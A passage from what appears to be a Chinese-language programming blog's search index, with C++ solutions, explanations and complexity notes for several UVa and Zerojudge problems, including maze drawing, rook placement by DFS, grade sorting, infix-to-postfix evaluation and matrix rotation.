class="built_in">cout</span>&lt;&lt;<span class="string">"Yes\n"</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"No\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>掃過一次字串即可，每次複雜度為 $O(len(s))$<br>總複雜度 $O(tlen(s))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>資料結構</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa445</title>
    <url>/2020/07/02/UVa445/</url>
    <content><![CDATA[<h1 id="UVa445"><a href="#UVa445" class="headerlink" title="UVa445"></a>UVa445</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?445" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?445</a><br>給一字串包含一迷宮的地圖資訊，求地圖的樣子</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>依據題目對於地圖資訊的描述輸出相對應字元即可<br>數字部分可以另外用變數儲存，記得每次輸出完歸零</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> step;</span><br><span class="line"><span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>((step=<span class="built_in">cin</span>.get())!=EOF)&#123;</span><br><span class="line">		<span class="keyword">if</span>(step==<span class="string">'\n'</span> || step==<span class="string">'!'</span>)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(step&lt;=<span class="string">'9'</span> &amp;&amp; step&gt;=<span class="string">'0'</span>)&#123;</span><br><span class="line">			cnt+=(step-<span class="string">'0'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>((step&lt;=<span class="string">'Z'</span> &amp;&amp; step&gt;=<span class="string">'A'</span>) || step==<span class="string">'*'</span>)&#123;</span><br><span class="line">			<span class="keyword">while</span>(cnt)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;step;</span><br><span class="line">				cnt--;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(step==<span class="string">'b'</span>)&#123;</span><br><span class="line">			<span class="keyword">while</span>(cnt)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">				cnt--;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>$O(len(s))$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa639</title>
    <url>/2020/06/16/UVa639/</url>
    <content><![CDATA[<h1 id="UVa639"><a href="#UVa639" class="headerlink" title="UVa639"></a>UVa639</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?639" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?639</a><br>給一個 $n \times n$ 的棋盤，其中<code>.</code>表示空格子，<code>X</code>表示障礙物<br>如同西洋棋中城堡的走法，求在互不影響下，能在棋盤中放入最多多少城堡且互不影響</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>DFS走訪每個點，枚舉有放及沒放的結果，取最大值</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,ans=<span class="number">0</span>,rock=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> arr[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="keyword">bool</span> put[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ok</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=y<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr[x][i] == <span class="string">'X'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(put[x][i])</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=x<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(arr[i][y] == <span class="string">'X'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(put[i][y])</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">pii <span class="title">Next</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(y+<span class="number">1</span>&gt;=n)&#123;</span><br><span class="line">		<span class="keyword">return</span> make_pair(x+<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> make_pair(x,y+<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(pii px)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x=px.first,y=px.second;</span><br><span class="line">	<span class="keyword">if</span>(x==n<span class="number">-1</span> &amp;&amp; y==n<span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="comment">//end</span></span><br><span class="line">		<span class="keyword">if</span>(arr[x][y] == <span class="string">'X'</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">if</span>(ok(x,y))</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(arr[x][y] == <span class="string">'.'</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(ok(x,y))&#123;</span><br><span class="line">			put[x][y]=<span class="literal">true</span>;</span><br><span class="line">			rock++;</span><br><span class="line">			ret=max(ret,dfs(Next(x,y)))+<span class="number">1</span>;</span><br><span class="line">			put[x][y]=<span class="literal">false</span>;</span><br><span class="line">			rock--;</span><br><span class="line">		&#125;		</span><br><span class="line">		ret=max(ret,dfs(Next(x,y)));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		ret=max(ret,dfs(Next(x,y)));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		<span class="built_in">memset</span>(put,<span class="literal">false</span>,<span class="keyword">sizeof</span>(put));</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;n ; j++)</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;dfs(make_pair(<span class="number">0</span>,<span class="number">0</span>))&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>走訪點數量為 $n \times n$，每個點枚舉2種狀態<br>總複雜度 $O(2^{n^2})$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
        <tag>DFS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge b964</title>
    <url>/2020/06/27/Zerojudge%20b694/</url>
    <content><![CDATA[<h1 id="Zerojudge-b694"><a href="#Zerojudge-b694" class="headerlink" title="Zerojudge b694"></a>Zerojudge b694</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=b964" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=b964</a><br>給定 $n$ 個成績，求成績排序後結果、不及格中最高分、及格中最低分</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>排序可以直接用STL sort解決<br>其他可以拿兩個變數紀錄即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,arr[<span class="number">1000</span>],lucky=<span class="number">999</span>,unlucky=<span class="number">-1</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		<span class="keyword">if</span>(arr[i]&gt;=<span class="number">60</span>)</span><br><span class="line">			lucky = min(lucky,arr[i]);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			unlucky = max(unlucky,arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	sort(arr,arr+n);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i)</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;arr[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">if</span>(unlucky == <span class="number">-1</span>)</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"best case\n"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;unlucky&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">if</span>(lucky==<span class="number">999</span>)</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"worst case\n"</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;lucky&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>找尋lucky number及unlucky number複雜度為 $O(n)$<br>sort複雜度為 $O(nlogn)$<br>總複雜度 $O(n+nlogn)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge a017</title>
    <url>/2020/09/11/Zerojudge%20a017/</url>
    <content><![CDATA[<h1 id="Zerojudge-a017"><a href="#Zerojudge-a017" class="headerlink" title="Zerojudge a017"></a>Zerojudge a017</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=a017" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=a017</a><br>給定一個中序運算式，包含 <code>+</code> <code>-</code> <code>*</code> <code>/</code> <code>%</code> ，求運算結果</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>對於中序運算在想法上比較不容易思考，改成後序運算會更佳<br>因此我先將給定運算式轉成後序運算式，再進行運算</p>
<p>簡單介紹一下前、中、後序運算<br>例如在中序運算式是 $1 + ( 2 + 3 * 5 ) % 2$</p>
<h3 id="前序"><a href="#前序" class="headerlink" title="前序"></a>前序</h3><p>前序運算會將上述的運算式改成 $+ 1 % + 2 * 3 5 2$<br>從右邊看回來</p>
<ol>
<li>$+ 1 % + 2 15 2$</li>
<li>$+ 1 % 17 2$</li>
<li>$+ 1 1$</li>
<li>$2$</li>
</ol>
<h3 id="中序"><a href="#中序" class="headerlink" title="中序"></a>中序</h3><p>中序運算是由左向右看，遇到括號從內往外看，先乘除後加減<br>平常我們使用的都是中序運算</p>
<ol>
<li>$1 + ( 2 + 15 ) % 2$</li>
<li>$1 + ( 17 ) % 2$</li>
<li>$1 + 1$</li>
<li>$2$</li>
</ol>
<h3 id="後序"><a href="#後序" class="headerlink" title="後序"></a>後序</h3><p>後序運算會先將上述運算式改成 $1 2 3 5 * + 2 % +$<br>從左邊看過去，遇到運算子就向前取兩個運算元進行計算</p>
<ol>
<li>$1 2 15 + 2 % +$</li>
<li>$1 17 2 % +$</li>
<li>$1 1 +$</li>
<li>$2$</li>
</ol>
<p>(也可參考此資料: <a href="https://magiclen.org/arithmetic/" target="_blank" rel="noopener">https://magiclen.org/arithmetic/</a>)</p>
<p>後序運算會先將運算元放入，再將運算子放入<br>這邊會用一個stack儲存運算元，並用vector或queue儲存結果<br>為了達到先乘除後加減，需要對運算子的優先度進行判斷<br>轉換情況如下</p>
<ol>
<li>遇到運算元，直接放入結果</li>
<li>遇到 <code>(</code>，直接放入stack</li>
<li>遇到運算子<ol>
<li>將stack頂端所有優先度&lt;=當前運算子的都放入結果</li>
<li>將當前運算子放入stack</li>
</ol>
</li>
<li>遇到<code>)</code>，將stack中所有在<code>(</code>後的元素都放入結果，並將<code>(</code>移除</li>
</ol>
<p>而這裡轉換成後序運算式後我們可以利用<strong>stack</strong>達成計算<br>從左邊開始，每次將運算內容放進stack<br>遇到運算子就從stack拿出兩個運算元計算，再重新推入stack<br>重複直到運算式結束</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="built_in">stack</span>&lt;<span class="built_in">string</span>&gt; op;</span><br><span class="line"><span class="built_in">string</span> input,tr;</span><br><span class="line"><span class="built_in">queue</span>&lt;<span class="built_in">string</span>&gt; res;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">prior</span><span class="params">(<span class="built_in">string</span> ch)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(ch==<span class="string">"+"</span> || ch==<span class="string">"-"</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="string">"*"</span> || ch==<span class="string">"/"</span> || ch==<span class="string">"%"</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">is_op</span><span class="params">(<span class="built_in">string</span> ch)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(ch==<span class="string">"+"</span> || ch==<span class="string">"-"</span> || ch==<span class="string">"*"</span> || ch==<span class="string">"/"</span> || ch==<span class="string">"%"</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">to_post</span><span class="params">(<span class="built_in">string</span> s)</span></span>&#123;</span><br><span class="line">	<span class="built_in">stringstream</span> ss;</span><br><span class="line">	ss&lt;&lt;input;</span><br><span class="line">	<span class="keyword">while</span>(!res.empty()) res.pop();</span><br><span class="line">	<span class="keyword">while</span>(ss&gt;&gt;tr)&#123;</span><br><span class="line">		<span class="keyword">if</span>(is_op(tr))&#123;</span><br><span class="line">			<span class="keyword">while</span>(!op.empty() &amp;&amp; prior(tr) &lt;= prior(op.top()))&#123;</span><br><span class="line">				res.push(op.top());</span><br><span class="line">				op.pop();</span><br><span class="line">			&#125;</span><br><span class="line">			op.push(tr);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(tr == <span class="string">"("</span>)&#123;</span><br><span class="line">			op.push(tr);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(tr == <span class="string">")"</span>)&#123;</span><br><span class="line">			<span class="keyword">while</span>(op.top()!=<span class="string">"("</span>)&#123;</span><br><span class="line">				res.push(op.top());</span><br><span class="line">				op.pop();</span><br><span class="line">			&#125;</span><br><span class="line">			op.pop();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			res.push(tr);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(!op.empty())&#123;</span><br><span class="line">		res.push(op.top());</span><br><span class="line">		op.pop();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">string_to_num</span><span class="params">(<span class="built_in">string</span> s)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">		ret*=<span class="number">10</span>;</span><br><span class="line">		ret+=s[i]-<span class="string">'0'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(getline(<span class="built_in">cin</span>,input))&#123;</span><br><span class="line">		to_post(input);</span><br><span class="line">		<span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; nums;</span><br><span class="line">		<span class="keyword">while</span>(!res.empty())&#123;</span><br><span class="line">			<span class="keyword">if</span>(is_op(res.front()))&#123;</span><br><span class="line">				<span class="keyword">int</span> b = nums.top();</span><br><span class="line">				nums.pop();</span><br><span class="line">				<span class="keyword">int</span> a = nums.top();</span><br><span class="line">				nums.pop();</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">if</span>(res.front() == <span class="string">"+"</span>)&#123;</span><br><span class="line">					nums.push(a+b);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(res.front() == <span class="string">"-"</span>)&#123;</span><br><span class="line">					nums.push(a-b);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(res.front() == <span class="string">"*"</span>)&#123;</span><br><span class="line">					nums.push(a*b);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(res.front() == <span class="string">"/"</span>)&#123;</span><br><span class="line">					nums.push(a/b);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					nums.push(a%b);</span><br><span class="line">				&#125;</span><br><span class="line">				res.pop();</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				nums.push(string_to_num(res.front()));</span><br><span class="line">				res.pop();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;nums.top()&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">		nums.pop();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>轉成後序運算式的複雜度為 $O(len(input))$</p>
<p>計算的時間複雜度也約為 $O(len(input))$</p>
<p>整體複雜度為 $O(2len(input))$ ，約為 $O(len(input))$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
      </categories>
      <tags>
        <tag>資料結構</tag>
        <tag>Zerojudge</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge b965</title>
    <url>/2020/06/27/Zerojudge%20b965/</url>
    <content><![CDATA[<h1 id="Zerojudge-b965"><a href="#Zerojudge-b965" class="headerlink" title="Zerojudge b965"></a>Zerojudge b965</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=b965" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=b965</a><br>給定一個矩陣經過多次 旋轉/翻轉 後的樣子，求原矩陣</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>將操作反著做回來即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> r,c,m,arr[<span class="number">10</span>][<span class="number">10</span>],tmp[<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cycle</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">memset</span>(tmp,<span class="number">0</span>,<span class="keyword">sizeof</span>(tmp));</span><br><span class="line">	swap(r,c);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;r ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;c ; j++)&#123;</span><br><span class="line">			tmp[i][j] = arr[j][r-i<span class="number">-1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	swap(arr,tmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flip</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=r<span class="number">-1</span>,j=<span class="number">0</span> ; i&gt;j ; i--,j++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span> ; k&lt;c ; k++)&#123;</span><br><span class="line">			swap(arr[i][k],arr[j][k]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_arr</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;r ; i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;c ; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(j)</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;<span class="string">' '</span>;</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;arr[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;r&gt;&gt;c&gt;&gt;m)&#123;</span><br><span class="line">		<span class="built_in">memset</span>(arr,<span class="number">0</span>,<span class="keyword">sizeof</span>(arr));</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;r ; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;c ; j++)&#123;</span><br><span class="line">				<span class="built_in">cin</span>&gt;&gt;arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; s;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,tmp ; i&lt;m ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;tmp;</span><br><span class="line">			s.push(tmp);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">while</span>(!s.empty())&#123;</span><br><span class="line">			<span class="keyword">int</span> now=s.top();</span><br><span class="line">			<span class="keyword">if</span>(now==<span class="number">0</span>)</span><br><span class="line">				cycle();</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				flip();</span><br><span class="line">			s.pop();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;r&lt;&lt;<span class="string">" "</span>&lt;&lt;c&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		print_arr();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

